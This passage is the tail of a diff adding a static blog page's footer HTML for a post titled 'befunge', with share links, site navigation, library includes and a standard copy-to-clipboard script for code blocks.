+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xidoo123.github.io/2021/01/12/befunge/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xidoo123.github.io/2021/01/12/befunge/&text=befunge" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xidoo123.github.io/2021/01/12/befunge/&is_video=false&description=befunge" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=befunge&body=Check out this article: https://xidoo123.github.io/2021/01/12/befunge/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xidoo123.github.io/2021/01/12/befunge/&name=befunge&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xidoo123.github.io/2021/01/12/befunge/&t=befunge" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2021
+    X1do0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
